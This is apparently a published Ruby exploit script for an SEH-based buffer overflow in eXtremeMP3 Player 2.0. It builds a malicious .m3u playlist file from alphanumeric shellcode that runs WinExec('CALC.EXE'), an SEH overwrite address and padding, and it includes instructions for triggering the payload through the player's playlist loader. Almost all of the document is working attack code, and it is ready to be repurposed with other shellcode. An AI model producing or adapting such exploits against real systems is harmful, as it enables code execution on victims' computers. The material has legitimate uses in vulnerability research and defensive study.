#
#
#[+]Exploit Title: Exploit Bufer Overflow eXtremeMP3 Player(SEH)
#[+]Date: 01\15\2010
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://ukms.tucows.com/files2/xtremv20RC1.exe
#[+]Version: 2.0
#[+]Tested on: WIN-XP SP3 BRAZILIAN
#[+]CVE: N/A
#
#Create by C4SS!0 G0M3S
#WWW.INVASAO.COM.BR
#Louredo_@hotmail.com
#
#  #########     ##    #########      #########   ##     ###############
#  ########    ####    #########      #########   ##     ##           ##    
#  ##         ## ##    ##             ##          ##     ##           ## 
#  ##        ##  ##    ##             ##          ##     ##           ##
#  ##       ########## ########       ########    ##     ##           ##
#  ##            ##          ##             ##    ##     ##           ##
#  ##            ##          ##             ##    ##     ##           ##
#  ########      ##    ########      #########    ##     ##           ##
#  ########      ##    ########      #########    \/     ###############
#                                               
#Note: To Exploit Works Download Software Open The Playlist Manager Click On Playlist 
#Load select The Malicious File And Appears Ready Boom Calc
#
#
#Sorry my English I don't Epeak English
#

system("cls")
system("color 4f")
def Usage()
     puts "\n\n\n[+]Exploit: Exploit Buffer Overflow eXtremeMP3 Player"
	 puts "[+]Date: 01\\14\\2011"
	 puts "[+]Author: C4SS!0 G0M3S"
	 puts "[+]Home: www.invasao.com.br"
	 puts "[+]E-mail: Louredo_@hotmail.com"
	 puts "[+]Impact: Hich"
	 puts "[+]Tested On: WIN-XP SP3 PORTUQUESE BRAZILIAN"
     puts "[+]Version: 2.0\n"
	 puts "[+]Software: eXtremeMP3 Player\n\n" 
     puts "Note: For the Exploit Works File Must be File_Name.m3u\n\n"
end	 
	 

if ARGV.length !=1:
     Usage()
     puts "[-]Usage: "+$0+" <File Name> "
	 puts "[-]Exemple: "+$0+" file.m3u "
	 exit
end
Usage()
buffer = "\x50\x59\x83\xC1\x42\x51\x58\x50\xC3"
buffer += "\x42" * (59-buffer.length)
puts "[*]Identifying the Length of Shellcode"
sleep(1)
shellcode = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI9KIP01YYOO3LTV2PHLXYR"+
"TQ4KDNQENPXVQT828MSM8KL5SRXSXKDK5VPCHOLU59YBXOFWSKEL384NNCM4BNJWJ7B5LOO52ZM5MPTN"+  #SHELLCODE ALPHA UPPERCASE BASEADDRESS [EAX]
"5E6GYWQZGLVU0L5RQYZ36P5ZUEDYWCLKKEK5URKZPWW9MG8KMGR08UKNBKXXCJWGKSJXOPL0OQ3N3PSN"+   #SHELLCODE WinExec("CALC.EXE",0)	
"D0WZW9HGKK3LNK3UOV70SSTPQOQ6SXMJUXFKE9QSNLXZUNJJQ35OXWVLY7MWK9PN9KNV1CQH6DN6OMU4"+
"YLGOG2XVOPYLPSKN7UU3OKXSK8JA"
puts "[*]The Length is Shellcode:#{shellcode.length}"
sleep(1)
buffer += shellcode
buffer += "\x43" * (4097-buffer.length)

nseh = "\xcc\xcc\xcc\xcc"
seh = [0x7CE1B9C6].pack('V')#POPAD / JMP EAX
junk = "ABCDEFGHIJKLMNOPQRSTUVXZ"



payload = buffer+nseh+seh+junk

file = ARGV[0]
head = "http://"+payload

op = "w"
puts "[*]Creating the Archive #{file}"
sleep(1)
begin
     f = File.open(file,op)
     f.puts head
     f.close()
	 puts "[*]The Archive was Created #{file} Success"
	 sleep(1)
rescue
     puts "ERROR TO CREATE THE FILE"+file
end